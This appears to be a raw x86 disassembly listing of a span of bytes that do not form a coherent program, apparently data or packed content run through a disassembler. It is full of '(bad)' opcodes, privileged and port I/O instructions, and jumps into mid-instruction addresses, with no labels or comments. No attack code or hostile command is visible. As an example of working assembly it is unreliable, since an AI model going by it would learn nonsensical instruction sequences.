  41d46a:	sub    ch,BYTE PTR [edi]
  41d46c:	xchg   ebx,eax
  41d46d:	mov    edi,0xefbc046f
  41d472:	popa   
  41d473:	dec    ecx
  41d474:	gs jmp 0x41d444
  41d477:	lahf   
  41d478:	cwde   
  41d479:	sub    BYTE PTR [ebp+0x19],ah
  41d47c:	es push eax
  41d47e:	test   eax,0x5e56b59b
  41d483:	jmp    0x41d466
  41d485:	rcpps  xmm2,XMMWORD PTR [edi]
  41d488:	lods   eax,DWORD PTR ds:[esi]
  41d489:	in     al,0x9a
  41d48b:	sub    eax,0xb9211989
  41d490:	scas   eax,DWORD PTR es:[edi]
  41d491:	mov    ds:0x10f7ce67,al
  41d496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d497:	stc    
  41d498:	dec    edi
  41d499:	imul   edi,DWORD PTR [edx+0x1fe75469],0x2e
  41d4a0:	xchg   esi,eax
  41d4a1:	pop    eax
  41d4a2:	mov    esi,DWORD PTR [esi+0x78]
  41d4a5:	add    ah,cl
  41d4a7:	inc    ebp
  41d4a8:	sub    eax,0x3fae5172
  41d4ad:	test   DWORD PTR [esi+0x54],edi
  41d4b0:	cmp    ah,BYTE PTR [ebp+0x27815b65]
  41d4b6:	sbb    ch,BYTE PTR [eax]
  41d4b8:	jns    0x41d476
  41d4ba:	pop    edi
  41d4bb:	mov    dl,0x88
  41d4bd:	arpl   WORD PTR [edi-0x77],bp
  41d4c0:	mov    al,ds:0x5848203f
  41d4c5:	sub    dh,BYTE PTR [ebp-0x36]
  41d4c8:	xchg   ebp,eax
  41d4c9:	mov    ch,0xe4
  41d4cb:	in     eax,dx
  41d4cc:	sti    
  41d4cd:	pop    esp
  41d4ce:	adc    BYTE PTR [ecx],ch
  41d4d0:	hlt    
  41d4d1:	adc    BYTE PTR [esi],ch
  41d4d3:	jg     0x41d511
  41d4d5:	ret    
  41d4d6:	mov    edi,0x188432e5
  41d4db:	clc    
  41d4dc:	mov    edi,0xc2570269
  41d4e1:	out    dx,al
  41d4e2:	lahf   
  41d4e3:	dec    edx
  41d4e4:	hlt    
  41d4e5:	(bad)  
  41d4e6:	push   cs
  41d4e7:	(bad)  
  41d4e8:	xchg   edi,eax
  41d4e9:	fidiv  DWORD PTR [edx+0x75635f16]
  41d4ef:	jnp    0x41d48b
  41d4f1:	enter  0x7506,0x9d
  41d4f5:	inc    esi
  41d4f6:	daa    
  41d4f7:	out    0xeb,eax
  41d4f9:	out    0xde,al
  41d4fb:	pusha  
  41d4fc:	mov    eax,0xf8bedccb
  41d501:	mov    fs,WORD PTR [edx+0x1e]
  41d504:	arpl   WORD PTR [ebp+ebp*1-0x49],si
  41d508:	call   0x3682:0x6d030b99
  41d50f:	ret    0xd17
  41d512:	shr    DWORD PTR [ebx+edx*8],1
  41d515:	inc    esp
  41d516:	outs   dx,DWORD PTR ds:[esi]
  41d517:	imul   eax,esi,0xd3a755ab
  41d51d:	je     0x41d4d0
  41d51f:	(bad)  
  41d520:	popf   
  41d521:	dec    ebx
  41d522:	mov    ecx,0x66effff3
  41d527:	stc    
  41d528:	sahf   
  41d529:	(bad)  
  41d52a:	pop    esi
  41d52b:	and    esi,0xffffffdf
  41d52e:	pusha  
  41d52f:	jmp    0x1a990d9d
  41d534:	ret    
  41d535:	aaa    
  41d536:	not    DWORD PTR [ebp+0x27647481]
  41d53c:	fsub   QWORD PTR [edi+0x75db9cdb]
  41d542:	or     al,0x8
  41d544:	add    esp,DWORD PTR [edx-0x6f]
  41d547:	test   al,0x47
  41d549:	imul   esi,DWORD PTR [ecx+0xb],0xffffff91
  41d54d:	adc    eax,0x24b997cb
  41d552:	add    BYTE PTR [esi],bh
  41d554:	and    BYTE PTR [eax+0x6e],cl
  41d557:	popa   
  41d558:	xlat   BYTE PTR ds:[ebx]
  41d559:	xchg   DWORD PTR [edx],esi
  41d55b:	jnp    0x41d58d
  41d55d:	aaa    
  41d55e:	add    bl,BYTE PTR [ebx+esi*8+0x69]
  41d562:	jg     0x41d5b3
  41d564:	scas   eax,DWORD PTR es:[edi]
  41d565:	push   eax
  41d566:	js     0x41d584
  41d568:	pop    edi
  41d569:	sbb    al,BYTE PTR [ebx]
  41d56b:	int    0x9b
  41d56d:	mov    esi,0xbf104105
  41d572:	test   BYTE PTR ds:0x6f60b5a7,dl
  41d578:	loopne 0x41d52e
  41d57a:	mov    ds:0xd3e7536,al
  41d57f:	cmp    DWORD PTR [eax],ebx
  41d581:	pop    ss
  41d582:	jns    0x41d596
  41d584:	cmp    bh,BYTE PTR [ecx-0x76235309]
  41d58a:	push   ss
  41d58b:	and    esp,DWORD PTR [edx+0x45]
  41d58e:	jge    0x41d566
  41d590:	fild   WORD PTR [eax+ebp*4]
  41d593:	jmp    0x41d601
  41d595:	mov    ah,0x65
  41d597:	leave  
  41d598:	imul   eax,esi,0x29
  41d59b:	cld    
  41d59c:	lahf   
  41d59d:	in     eax,0xcb
  41d59f:	add    eax,0xc93097b5
  41d5a4:	cvtps2pd xmm5,QWORD PTR [edi+0x1677443a]
  41d5ab:	cmovs  esp,DWORD PTR [ebx+ebx*2+0x34]
  41d5b0:	jns    0x41d5df
  41d5b2:	add    eax,0x6e3b66cc
  41d5b7:	xchg   esp,eax
  41d5b8:	sub    DWORD PTR [edx],eax
  41d5ba:	jno    0x41d5cc
  41d5bc:	js     0x41d5f9
  41d5be:	ret    0xd117
  41d5c1:	ds jge 0x41d5fd
  41d5c4:	mov    edi,0x669db5b7
  41d5c9:	push   edx
  41d5ca:	shl    DWORD PTR [eax],1
  41d5cc:	inc    esp
  41d5cd:	ss retf 0xb4a4
  41d5d1:	push   cs
  41d5d2:	dec    ebx
  41d5d3:	jno    0x41d5ac
  41d5d5:	push   eax
  41d5d6:	xor    eax,DWORD PTR [edi-0x66d93c2a]
  41d5dc:	fisubr WORD PTR [ecx+0x6a5fb92d]
  41d5e2:	aaa    
  41d5e3:	cmp    edx,DWORD PTR [ebp-0x1c1e402d]
  41d5e9:	push   ss
  41d5ea:	and    cl,BYTE PTR [edi-0x544f765a]
  41d5f0:	sbb    al,0xa6
  41d5f2:	inc    ebx
  41d5f3:	dec    ecx
  41d5f4:	mov    dh,dl
  41d5f6:	xor    esi,DWORD PTR [edx-0x225c988]
  41d5fc:	ret    
  41d5fd:	in     eax,dx
  41d5fe:	inc    ebx
  41d5ff:	and    DWORD PTR [esi+0x691454b1],edi
  41d605:	ja     0x41d5c0
  41d607:	mov    al,BYTE PTR [eax+0x7a3f3812]
  41d60d:	mov    edi,edi
  41d60f:	adc    dh,0xdc
  41d612:	mov    ebp,0x3de40958
  41d617:	add    eax,0xbad6142f
  41d61c:	mov    ebx,0x882e62b9
  41d621:	iret   
  41d622:	mov    es,WORD PTR [ebx+0x56]
  41d625:	sbb    BYTE PTR [edi+edi*1+0x24],bh
  41d629:	xor    eax,0x29d7164f
  41d62e:	inc    ebp
  41d62f:	mov    ch,0x6c
  41d631:	int3   
  41d632:	jmp    0x41d63a
  41d634:	inc    ebx
  41d635:	inc    edx
  41d636:	mov    ss,WORD PTR [edx]
  41d638:	add    eax,0x2a297cc4
  41d63d:	or     dl,BYTE PTR [edi-0x2e02f6]
  41d643:	div    ecx
  41d645:	(bad)  
  41d646:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d647:	dec    ecx
  41d648:	cmp    edi,DWORD PTR [ecx+esi*2+0x2b]
  41d64c:	ins    BYTE PTR es:[edi],dx
  41d64d:	pusha  
  41d64e:	ret    
  41d64f:	leave  
  41d650:	dec    edx
  41d651:	imul   edi,DWORD PTR [ebp-0x21],0xf0d95922
  41d658:	aam    0x3
  41d65a:	cmp    DWORD PTR [ebx-0x65],edi
  41d65d:	(bad)  
  41d65e:	(bad)  [ebp+ebp*8+0x45]
  41d662:	(bad)  
  41d664:	mov    WORD PTR fs:[ecx],?
  41d667:	stos   DWORD PTR es:[edi],eax
  41d668:	xor    DWORD PTR [eax-0x1e429ba5],esp
  41d66e:	adc    BYTE PTR [ebp+0x1a],al
  41d671:	add    eax,0xebcd483f
  41d676:	push   ds
  41d677:	jno    0x41d658
  41d679:	ss adc al,ah
  41d67c:	mov    ah,BYTE PTR [edi-0x37d7835f]
  41d682:	outs   dx,DWORD PTR ds:[esi]
  41d683:	jl     0x41d662
  41d685:	cmp    cl,BYTE PTR [ecx+eax*8+0x5a]
  41d689:	xlat   BYTE PTR ds:[ebx]
  41d68a:	cmc    
  41d68b:	pop    edx
  41d68c:	mov    cl,0x5a
  41d68e:	adc    ch,bh
  41d690:	add    BYTE PTR [ebp+0x33d1c930],0xfc
  41d697:	pop    ebp
  41d698:	sbb    ch,cl
  41d69a:	clc    
  41d69b:	sub    bl,bl
  41d69d:	xor    BYTE PTR [esi-0x6b1183f1],dh
  41d6a3:	leave  
  41d6a4:	mov    ds:0x4849ccd6,eax
  41d6a9:	push   0x5783b34f
  41d6ae:	fild   QWORD PTR [ecx]
  41d6b0:	mov    ah,0x77
  41d6b2:	rol    DWORD PTR [eax],cl
  41d6b4:	mov    dh,0x31
  41d6b6:	aad    0xc3
  41d6b8:	(bad)  
  41d6b9:	sti    
  41d6ba:	scas   eax,DWORD PTR es:[edi]
  41d6bb:	arpl   WORD PTR [ebx-0x7b7f036a],dx
  41d6c1:	push   ss
  41d6c2:	jnp    0x41d732
  41d6c4:	pop    ds
  41d6c5:	xor    BYTE PTR [esp+ebp*4-0x67],ch
  41d6c9:	xchg   ebx,esi
  41d6cb:	fmulp  st(1),st
  41d6cd:	mov    bh,dh
  41d6cf:	nop
  41d6d0:	(bad)  
  41d6d1:	xchg   ecx,eax
  41d6d2:	enter  0x19f9,0xe
  41d6d6:	imul   eax,ebp,0xffffff8f
  41d6d9:	jl     0x41d70d
  41d6db:	scas   al,BYTE PTR es:[edi]
  41d6dc:	xchg   edi,eax
  41d6dd:	mov    bl,0x8f
  41d6df:	ficomp WORD PTR [eax+ebx*2-0x41]
  41d6e3:	scas   eax,DWORD PTR es:[edi]
  41d6e4:	das    
  41d6e5:	fldcw  WORD PTR [ebx]
  41d6e7:	test   eax,0xa6a2fcb6
  41d6ec:	xchg   BYTE PTR [eax-0x1fb1ffd3],cl
  41d6f2:	ins    DWORD PTR es:[edi],dx
  41d6f3:	and    ch,BYTE PTR [edi-0x4ad9bd64]
  41d6f9:	or     eax,0x9f0e171d
  41d6fe:	mov    WORD PTR [ecx+0x75],?
  41d701:	inc    esp
  41d702:	pop    ebx
  41d703:	test   edi,edx
  41d705:	adc    DWORD PTR [ebp+ebx*2-0x50],ebp
  41d709:	test   BYTE PTR [edx],dh
  41d70b:	in     eax,dx
  41d70c:	sub    al,0xac
  41d70e:	xor    esp,DWORD PTR [edi+edi*8]
  41d711:	mov    ds:0x456e3cdc,al
  41d716:	mov    eax,0x3e5ee37c
  41d71b:	cmp    ch,BYTE PTR [ebp+0xbf9892]
  41d721:	mov    ebp,0x9d038adb
  41d726:	add    al,0xf4
  41d728:	fisub  WORD PTR [edi+0x7c]
  41d72b:	mov    ds,WORD PTR ds:0x998aa7a
  41d731:	pop    ecx
  41d732:	or     al,0xb
  41d734:	cdq    
  41d735:	mov    esp,0x3a658de4
  41d73a:	or     al,bh
  41d73c:	xchg   dh,dh
  41d73e:	jecxz  0x41d7b4
  41d740:	push   esp
  41d741:	sahf   
  41d742:	in     al,0xc4
  41d744:	sbb    edx,esi
  41d746:	nop
  41d747:	fmul   st(4),st
  41d749:	std    
  41d74a:	popa   
  41d74b:	inc    esi
  41d74c:	adc    al,0x1e
  41d74e:	push   ebx
  41d74f:	push   esi
  41d750:	cld    
  41d751:	outs   dx,DWORD PTR ds:[esi]
  41d752:	jb     0x41d6ed
  41d754:	mov    DWORD PTR [ebp-0x4f803d7d],0x6dce10fe
  41d75e:	out    dx,al
  41d75f:	push   ecx
  41d760:	push   ebx
  41d761:	sbb    eax,0xc17a8bb4
  41d766:	jmp    0x60c2:0xe35bb123
  41d76d:	sti    
  41d76e:	imul   ecx,DWORD PTR [ecx],0xffffff9a
  41d771:	ffreep st(1)
  41d773:	mov    esi,0x442e67bc
  41d778:	add    DWORD PTR [ebx],esi
  41d77a:	mov    edx,0xe1976826
  41d77f:	rcl    DWORD PTR [edi+0x23],1
  41d782:	dec    BYTE PTR ds:0x76ac8b91
  41d788:	push   esp
  41d789:	mov    bl,0x7c
  41d78b:	mov    cl,0x1e
  41d78d:	(bad)  
  41d78e:	lahf   
  41d78f:	cmp    bh,al
  41d791:	(bad)  
  41d792:	push   cs
  41d793:	arpl   WORD PTR [esi+esi*8],sp
  41d796:	outs   dx,BYTE PTR ds:[esi]
  41d797:	inc    esp
  41d798:	int    0xe5
  41d79a:	das    
  41d79b:	stc    
  41d79c:	mov    al,0x37
  41d79e:	or     al,0xbb
  41d7a0:	mov    al,0x5c
  41d7a2:	bound  edi,QWORD PTR [edi+0x32431def]
  41d7a8:	cmp    cl,cl
  41d7aa:	repz mov ebp,0x153e81d5
  41d7b0:	loopne 0x41d7da
  41d7b2:	mov    ebx,0x246d9ae
  41d7b7:	jnp    0x41d7a9
  41d7b9:	mov    al,ds:0x247e27e7
  41d7be:	mov    dl,0x34
  41d7c0:	fsubr  st(5),st
  41d7c2:	xchg   ebp,eax
  41d7c3:	fadd   DWORD PTR [esp+edi*4-0x1a]
  41d7c7:	fs xchg ebx,eax
  41d7c9:	push   es
  41d7ca:	inc    ebx
  41d7cb:	adc    DWORD PTR [ebp-0x467c19d0],edi
  41d7d1:	test   al,0xc9
  41d7d3:	mov    ds:0x7796634a,al
  41d7d8:	xchg   ecx,eax
  41d7d9:	adc    al,0xc8
  41d7db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7dc:	cmp    BYTE PTR [eax-0xf055da5],bl
  41d7e2:	hlt    
  41d7e3:	push   ecx
  41d7e4:	mov    edx,0x7f5dbbf5
  41d7e9:	xlat   BYTE PTR ds:[ebx]
  41d7ea:	xabort 0xe1
  41d7ed:	in     al,0x2e
  41d7ef:	out    0x64,al
  41d7f1:	pushf  
  41d7f2:	or     ebx,DWORD PTR [ebp-0x424a4941]
  41d7f8:	mov    esp,0x6c4f554f
  41d7fd:	cmp    eax,0x9ff710a0
  41d802:	add    eax,0xddadf87a
  41d807:	fdiv   DWORD PTR [edi]
  41d809:	mov    bl,0x2b
  41d80b:	mov    al,0x51
  41d80d:	aad    0xca
  41d80f:	add    DWORD PTR [esi+edx*4+0x3e96eb21],esi
  41d816:	mov    ds:0x36871855,al
  41d81b:	rcl    DWORD PTR [esi-0xe76dd99],cl
  41d821:	fcmovnbe st,st(3)
  41d823:	jle    0x41d81b
  41d825:	jae    0x41d815
  41d827:	xchg   ebx,eax
  41d828:	add    BYTE PTR [eax+0x1c],dl
  41d82b:	scas   eax,DWORD PTR es:[edi]
  41d82c:	and    al,0x28
  41d82e:	add    al,0x70
  41d830:	xlat   BYTE PTR ds:[ebx]
  41d831:	bound  ecx,QWORD PTR ds:0xeeaee3af
  41d837:	mov    ds:0xc015f8a6,eax
  41d83c:	retf   0xdd01
  41d83f:	or     dl,dh
  41d841:	sar    ecx,cl
  41d843:	cs popa 
  41d845:	mov    cl,0x85
  41d847:	arpl   WORD PTR [eax],bp
  41d849:	mov    eax,ds:0x8e8d4aa3
  41d84e:	adc    cl,ah
  41d850:	xor    dl,BYTE PTR [eax-0x2a2dedca]
  41d856:	jmp    0x41d80e
  41d858:	shl    DWORD PTR [eax+0x53],1
  41d85b:	pop    edx
  41d85c:	adc    eax,0x764bf3cd
  41d861:	sbb    DWORD PTR ds:0x511b4b12,ebx
  41d867:	fdiv   st,st(0)
  41d869:	icebp  
  41d86a:	outs   dx,DWORD PTR gs:[esi]
  41d86c:	sbb    esi,ebx
  41d86e:	xchg   esi,eax
  41d86f:	adc    ebx,ebp
  41d871:	or     eax,0x135f0c76
  41d876:	nop
  41d877:	aas    
  41d878:	and    al,0xa4
  41d87a:	pop    esi
  41d87b:	std    
  41d87c:	(bad)  
  41d87e:	loop   0x41d8fb
  41d880:	mov    al,0x1
  41d882:	push   ss
  41d883:	pop    ds
  41d884:	test   eax,0xe91d1ce
  41d889:	jae    0x41d87f
  41d88b:	cli    
  41d88c:	mov    ebp,0xdcb0c272
  41d891:	sub    BYTE PTR [edx],dl
  41d893:	push   0x8789e7e4
  41d898:	or     bh,dl
  41d89a:	jmp    0x41d855
  41d89c:	pop    esi
  41d89d:	lods   eax,DWORD PTR ds:[esi]
  41d89e:	lods   eax,DWORD PTR ds:[esi]
  41d89f:	ret    
  41d8a0:	dec    ebp
  41d8a1:	gs xchg ecx,eax
  41d8a3:	pop    ss
  41d8a4:	dec    ecx
  41d8a5:	xchg   DWORD PTR [esi+0x771a4926],edx
  41d8ab:	mov    ah,0x27
  41d8ad:	js     0x41d8fe
  41d8af:	push   0xffffffb2
  41d8b1:	scas   eax,DWORD PTR es:[edi]
  41d8b2:	es push ds
  41d8b4:	xchg   ecx,eax
  41d8b5:	push   edi
  41d8b6:	mov    ah,0x79
  41d8b8:	rol    DWORD PTR [ebp+0x1],1
  41d8bb:	mov    dl,0x40
  41d8bd:	jb     0x41d8bb
  41d8bf:	stos   BYTE PTR es:[edi],al
  41d8c0:	mov    esi,0x8d41fca9
  41d8c5:	imul   ecx,DWORD PTR [edi+0xc],0x1a9ba279
  41d8cc:	and    bl,BYTE PTR [ecx+0x9]
  41d8cf:	mov    ch,0x7b
  41d8d1:	popa   
  41d8d2:	retf   0x8eb5
  41d8d5:	and    ecx,esp
  41d8d7:	xor    al,BYTE PTR [edi+0x236cc806]
  41d8dd:	mov    BYTE PTR [edi-0xb],bl
  41d8e0:	jmp    0x758e:0x74d124ba
  41d8e7:	cld    
  41d8e8:	jns    0x41d89a
  41d8ea:	pop    esi
  41d8eb:	inc    esi
  41d8ec:	loopne 0x41d919
  41d8ee:	sti    
  41d8ef:	lods   eax,DWORD PTR ds:[esi]
  41d8f0:	test   al,0x1a
  41d8f2:	push   edx
  41d8f3:	bound  edx,QWORD PTR [edi]
  41d8f5:	pop    ecx
  41d8f6:	lahf   
  41d8f7:	arpl   WORD PTR [ebp-0x3064635a],dx
  41d8fd:	test   BYTE PTR [edx],0xb9
  41d900:	cmp    al,ah
  41d902:	and    ebp,DWORD PTR [eax]
  41d904:	xor    BYTE PTR [esp+eiz*4],bh
  41d907:	clc    
  41d908:	in     eax,dx
  41d909:	js     0x41d8f7
  41d90b:	jp     0x41d90e
  41d90d:	test   al,0x91
  41d90f:	jnp    0x41d8e3
  41d911:	push   ds
  41d912:	fild   QWORD PTR [edx+esi*2+0x1b]
  41d916:	arpl   WORD PTR [edi+0x67d683a5],bx
  41d91c:	inc    edi
  41d91d:	fcom   DWORD PTR [eax+0x34]
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	or     BYTE PTR [edi-0x869dd58],ch
  41d927:	add    BYTE PTR ds:0x125c4566,ch
  41d92d:	sar    BYTE PTR [eax+0x12],cl
  41d930:	imul   edi,DWORD PTR [eax],0xffffffbc
  41d933:	loopne 0x41d961
  41d935:	or     DWORD PTR [ecx-0x598d9bde],esi
  41d93b:	mov    eax,0x6b4c7d8e
  41d940:	pop    es
  41d941:	push   ebx
  41d942:	push   ecx
  41d943:	and    dh,bh
  41d945:	jo     0x41d95d
  41d947:	push   0xffffffea
  41d949:	jecxz  0x41d97b
  41d94b:	in     eax,dx
  41d94c:	xlat   BYTE PTR ds:[ebx]
  41d94d:	cdq    
  41d94e:	mul    BYTE PTR ds:0x7e33844e
  41d954:	addr16 jo 0x41d9be
  41d957:	js     0x41d8ec
  41d959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d95a:	or     ah,cl
  41d95c:	gs push esi
  41d95e:	shl    edi,cl
  41d960:	and    al,0xbb
  41d962:	mov    ds:0x2f3bc644,eax
  41d967:	add    al,0x3d
  41d969:	mov    al,0x86
  41d96b:	sub    BYTE PTR [ebx+ecx*2],bl
  41d96e:	jl     0x41d8f5
  41d970:	fmul   QWORD PTR [ecx+0x7c965df4]
  41d976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d977:	lds    ebx,FWORD PTR [edi]
  41d979:	mov    DWORD PTR [esi+0x2ecf1206],edi
  41d97f:	push   0x4f
  41d981:	jne    0x41d9be
  41d983:	ror    esi,cl
  41d985:	lahf   
  41d986:	shr    DWORD PTR [ebp+0x735a4363],0x5d
  41d98d:	repz arpl WORD PTR fs:[edx-0x5d249604],di
  41d995:	daa    
  41d996:	jnp    0x41d918
  41d998:	or     dl,0x48
  41d99b:	xchg   DWORD PTR [ecx],esi
  41d99d:	or     DWORD PTR [edx],ebp
  41d99f:	add    BYTE PTR [ecx-0x1b4bd39e],ch
  41d9a5:	aaa    
  41d9a6:	daa    
  41d9a7:	dec    esi
  41d9a8:	test   al,0x1f
  41d9aa:	imul   DWORD PTR [esi-0x7635d9cc]
  41d9b0:	push   ecx
  41d9b1:	repz xor bl,dh
  41d9b4:	xchg   ecx,eax
  41d9b5:	and    cl,dh
  41d9b7:	fdivr  DWORD PTR [edi-0x31bec9a4]
  41d9bd:	popa   
  41d9be:	jecxz  0x41d955
  41d9c0:	aad    0x95
  41d9c2:	fistp  DWORD PTR [ebp+ebp*1+0x46c7d6d]
  41d9c9:	fdiv   QWORD PTR [edi-0x2]
  41d9cc:	dec    esi
  41d9cd:	into   
  41d9ce:	clc    
  41d9cf:	xchg   ecx,eax
  41d9d0:	jmp    0x41da23
  41d9d2:	adc    ebp,edx
  41d9d4:	outs   dx,BYTE PTR ds:[esi]
  41d9d5:	jne    0x41d9be
  41d9d7:	mov    bh,0xa3
  41d9d9:	ret    0xe28f
  41d9dc:	mov    bl,0x8b
  41d9de:	dec    esp
  41d9df:	or     al,0xd9
  41d9e1:	push   esp
  41d9e2:	outs   dx,DWORD PTR ds:[esi]
  41d9e3:	test   al,0xb6
  41d9e5:	pop    edx
  41d9e6:	cmp    BYTE PTR [ebx-0x34],0xb
  41d9ea:	dec    eax
  41d9eb:	(bad)  
  41d9ec:	pop    DWORD PTR [ebp-0x66]
  41d9ef:	das    
  41d9f0:	mov    DWORD PTR [ebx-0x5cd839cd],eax
  41d9f6:	lahf   
  41d9f7:	jge    0x41d9d2
  41d9f9:	rcl    cl,0xf7
  41d9fc:	aaa    
  41d9fd:	jae    0x41da4d
  41d9ff:	repnz sysret 
  41da02:	popa   
  41da03:	jb     0x41d9e8
  41da05:	dec    eax
  41da06:	mov    esp,0xcbae6f14
  41da0b:	mov    cl,BYTE PTR [edi+0x7fe05611]
  41da11:	retf   0xc04f
  41da14:	xchg   edx,eax
  41da15:	push   ebp
  41da16:	cmp    al,0x9b
  41da18:	fstp   TBYTE PTR [edi]
  41da1a:	(bad)  
  41da1c:	retf   
  41da1d:	xor    al,0x95
  41da1f:	add    DWORD PTR ds:0x7dad258,edi
  41da25:	outs   dx,BYTE PTR ds:[esi]
  41da26:	push   edi
  41da27:	pushf  
  41da28:	jo     0x41da79
  41da2a:	imul   edi,DWORD PTR [edx],0x1da3dead
  41da30:	mov    ebp,0x12799e91
  41da35:	xchg   ecx,eax
  41da36:	sbb    BYTE PTR [esi+0x4b03589f],ah
  41da3c:	jbe    0x41da6f
  41da3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da3f:	pop    esi
  41da40:	mov    WORD PTR [ecx],cs
  41da42:	sbb    DWORD PTR [ebx+0x45],ebp
  41da45:	mov    dh,0x1b
  41da47:	fild   WORD PTR [edx-0x7b]
  41da4a:	pop    edx
  41da4b:	xor    cl,BYTE PTR [esi+0x43]
  41da4e:	jecxz  0x41da01
  41da50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da51:	adc    BYTE PTR [ebp+esi*2+0x76],ch
  41da55:	xchg   edi,eax
  41da56:	popf   
  41da57:	loope  0x41da4a
  41da59:	std    
  41da5a:	ror    BYTE PTR [edi+0x46],1
  41da5d:	sub    BYTE PTR [edi+eax*1+0x37],ch
  41da61:	xor    BYTE PTR [edi+0x2d3eac],bh
  41da67:	mov    cl,0xfe
  41da69:	aam    0xe
  41da6b:	xor    bh,BYTE PTR [edi]
  41da6d:	cmp    al,ah
  41da6f:	xchg   edx,eax
  41da70:	call   0xd57b:0x2ef47a83
  41da77:	sahf   
  41da78:	xchg   edx,eax
  41da79:	sbb    eax,0x3b9e203
  41da7e:	aam    0xe0
  41da80:	or     ah,BYTE PTR [ecx+0x6a]
  41da83:	mov    ds:0x7791ce0a,al
  41da88:	and    al,0x76
  41da8a:	pop    ebp
  41da8b:	push   esi
  41da8c:	sub    eax,0xbb42957c
  41da91:	mov    WORD PTR [edi],gs
  41da93:	arpl   WORD PTR [ebp+ecx*2+0x1922b19c],si
  41da9a:	xchg   WORD PTR [ebp+0x59],dx
  41da9e:	nop
  41da9f:	inc    ebp
  41daa0:	and    eax,0x18a8fea7
  41daa5:	aaa    
  41daa6:	and    DWORD PTR [ebp+0x41b2cc17],esp
  41daac:	or     dl,cl
  41daae:	sub    BYTE PTR [eax-0x73],bh
  41dab1:	es jp  0x41dabc
  41dab4:	jp     0x41da47
  41dab6:	cdq    
  41dab7:	push   0xe0c6b48a
  41dabc:	push   ds
  41dabd:	lods   eax,DWORD PTR ds:[esi]
  41dabe:	dec    esp
  41dabf:	aas    
  41dac0:	neg    dl
  41dac2:	adc    bl,ah
  41dac4:	xchg   edi,eax
  41dac5:	addr16 pop ss
  41dac7:	inc    ecx
  41dac8:	jmp    0x7f9:0x85243aba
  41dacf:	jp     0x41da71
  41dad1:	xchg   ecx,eax
  41dad2:	and    ebp,DWORD PTR [ecx]
  41dad4:	repz jl 0x41db2e
  41dad7:	pop    es
  41dad8:	pop    edx
  41dad9:	inc    esi
  41dada:	arpl   WORD PTR [edi-0x43821bf8],dx
  41dae0:	pushw  0x15c9
  41dae4:	neg    cl
  41dae6:	lock xchg ebp,eax
  41dae9:	xor    cl,BYTE PTR [ecx+0x817dc16]
  41daef:	adc    al,0x57
  41daf1:	scas   eax,DWORD PTR es:[edi]
  41daf2:	sbb    DWORD PTR [edx+0x4e],ebp
  41daf5:	jge    0x41db1f
  41daf7:	inc    esp
  41daf8:	lock js 0x41db46
  41dafb:	aam    0x31
  41dafd:	adc    eax,0xf000fcba
  41db02:	nop
  41db03:	xor    ah,BYTE PTR [edx-0x65d7fa99]
  41db09:	jl     0x41dad4
  41db0b:	dec    ecx
  41db0c:	mov    al,ds:0xf59d693e
  41db11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db12:	xor    eax,0xf93dfee2
  41db17:	or     al,0xc9
  41db19:	cld    
  41db1a:	lods   eax,DWORD PTR ds:[esi]
  41db1b:	mov    ds:0xed2f5496,al
  41db20:	xchg   dl,bl
  41db22:	test   DWORD PTR [edx-0x3320eb0b],ecx
  41db28:	ins    DWORD PTR es:[edi],dx
  41db29:	fscale 
  41db2b:	cs pop ds
  41db2d:	rcl    DWORD PTR [esi-0x6e2c17c6],1
  41db33:	mov    dl,0x7c
  41db35:	aas    
  41db36:	add    DWORD PTR [ecx-0x57],esp
  41db39:	mov    ebp,0xea1db5f5
  41db3e:	repnz and cl,BYTE PTR [esi]
  41db41:	rcr    DWORD PTR [ebx-0x1dac62c7],1
  41db47:	outs   dx,BYTE PTR ds:[esi]
  41db48:	ficomp DWORD PTR [eax-0x18]
  41db4b:	ss clc 
  41db4d:	in     al,0x7d
  41db4f:	sbb    BYTE PTR [edx],0x9
  41db52:	into   
  41db53:	stos   BYTE PTR es:[edi],al
  41db54:	adc    al,0x22
  41db56:	lea    edi,[eax-0xb]
  41db59:	pop    ss
  41db5a:	cli    
  41db5b:	test   edi,esi
  41db5d:	ins    BYTE PTR es:[edi],dx
  41db5e:	retf   
  41db5f:	mov    ecx,fs
  41db61:	rep stos BYTE PTR es:[edi],al
  41db63:	pop    ss
  41db64:	push   eax
  41db65:	adc    ecx,DWORD PTR [esi+0x32]
  41db68:	(bad)  
  41db69:	repz sbb eax,0xf1260f6b
  41db6f:	loopne 0x41db6b
  41db71:	dec    ecx
  41db72:	add    ebp,DWORD PTR [ebx-0x4f18a42b]
  41db78:	loope  0x41db6a
  41db7a:	or     al,0xeb
  41db7c:	dec    esi
  41db7d:	sti    
  41db7e:	call   0x2988ecd4
  41db83:	loopne 0x41db0d
  41db85:	sahf   
  41db86:	bound  ebx,QWORD PTR [edx]
  41db88:	cs jno 0x41db33
  41db8b:	cmp    esp,0x4c
  41db8e:	inc    ecx
  41db8f:	xor    al,BYTE PTR [ebx-0x31]
  41db92:	mov    bl,0xd3
  41db94:	cmp    eax,0x251e00cf
  41db99:	sbb    DWORD PTR [edx],0xffffff97
  41db9c:	loop   0x41db9f
  41db9e:	mov    dh,0xb3
  41dba0:	popa   
  41dba1:	inc    edi
  41dba2:	iret   
  41dba3:	fs sub eax,0x41628388
  41dba9:	and    BYTE PTR [esi+0x3b],bl
  41dbac:	jns    0x41db88
  41dbae:	push   ecx
  41dbaf:	into   
  41dbb0:	std    
  41dbb1:	and    BYTE PTR ds:0x6a65901f,dh
  41dbb7:	pop    edi
  41dbb8:	pop    edi
  41dbb9:	pop    es
  41dbba:	adc    BYTE PTR [edx+0x75aba87c],0x29
  41dbc1:	push   esi
  41dbc2:	sbb    BYTE PTR [esi+0x2755f55a],dl
  41dbc8:	jae    0x41dbf7
  41dbca:	jbe    0x41dc33
  41dbcc:	je     0x41dbfa
  41dbce:	(bad)  
  41dbcf:	mov    bh,0x53
  41dbd1:	push   ds
  41dbd2:	outs   dx,BYTE PTR ds:[esi]
  41dbd3:	and    eax,0x8bf901db
  41dbd8:	and    BYTE PTR [edx-0x11a76eab],bh
  41dbde:	add    edx,DWORD PTR [edx]
